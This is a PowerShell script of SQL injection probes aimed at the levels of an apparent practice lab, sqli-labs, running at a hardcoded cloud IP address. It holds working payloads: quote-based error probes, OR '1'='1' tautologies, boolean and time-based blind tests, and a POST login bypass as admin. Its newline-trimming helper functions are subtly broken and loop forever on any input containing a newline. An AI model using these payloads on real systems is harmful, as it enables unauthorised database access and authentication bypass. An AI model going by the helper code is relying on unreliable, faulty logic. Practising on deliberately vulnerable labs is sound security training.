# PowerShell SQLi Testing Examples
#
# Replace $ip with your GCP instance external IP.

$ip = "34.59.129.231"

# function that replaces multiple newlines with a single newline
function Replace-MultipleNewlines {
    param (
        [string]$inputString
    )
    
    # while MultipleNewlines exists
    while ($inputString -match '\r?\n+') {
        $inputString = $inputString -replace '\r?\n+', "`n"
    }
    
    $inputString
}


# Trim and replace multiple newlines with a single newline
function Better-Trim {
    param (
        [string]$inputString
    )
    
    # while MultipleNewlines exists
    while ($inputString -match '\r?\n+') {
        $inputString = $inputString -replace '\r?\n+', "`n"
    }
    
    $inputString.Trim()
}

# ============================================================================
# Less-1: Error-Based String Injection
# ============================================================================

# Normal Request
$payload="1"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password'

# Test for Vulnerability

# Single quote causes SQL error
$payload="1'"
(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'

# Confirm with comment
$payload="1'--"
(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'

# Extract data or test if we can successfully run a SQL command
$payload="1' OR '1'='1"
(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'password'

# ============================================================================
# Less-2: Error-Based Numeric Injection
# ============================================================================

# Normal Request
(iwr "http://$ip/Less-2/?id=1").Content.Trim()

# Test for Vulnerability

# Boolean-based
iwr "http://$ip/Less-2/?id=1 AND 1=1"
iwr "http://$ip/Less-2/?id=1 AND 1=2"

# Extract all rows
iwr "http://$ip/Less-2/?id=1 OR 1=1"

# ============================================================================
# Less-3: String with Twist (')
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-3/?id=1'"
iwr "http://$ip/Less-3/?id=1') OR ('1'='1"

# ============================================================================
# Less-4: Double Quotes
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-4/?id=1`""
iwr "http://$ip/Less-4/?id=1`") OR (`"1`"=`"1"

# ============================================================================
# Less-8: Blind Boolean-Based
# ============================================================================

# Test for Vulnerability

# True condition (page loads normally)
iwr "http://$ip/Less-8/?id=1' AND '1'='1"

# False condition (different response)
iwr "http://$ip/Less-8/?id=1' AND '1'='2"

# ============================================================================
# POST-Based Example (Less-11)
# ============================================================================

# Normal login
$body = @{
    uname = "admin"
    passwd = "password"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# SQL Injection
$body = @{
    uname = "admin' OR '1'='1"
    passwd = "anything"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# ============================================================================
# Useful PowerShell Tips
# ============================================================================

# View Response Content
$response = iwr "http://$ip/Less-1/?id=1"
$response.Content

# View Status Code
$response.StatusCode

# Measure Response Time (Blind Time-Based)
Measure-Command { iwr "http://$ip/Less-9/?id=1' AND SLEEP(5)--" }

# Save Response to File
iwr "http://$ip/Less-1/?id=1" -OutFile response.html

# ============================================================================
# URL Encoding in PowerShell
# ============================================================================

# PowerShell handles most encoding automatically, but for special chars:
[System.Web.HttpUtility]::UrlEncode("1' OR '1'='1")

# Or use backtick for escaping in double quotes
iwr "http://$ip/Less-1/?id=1`' OR `'1`'=`'1"
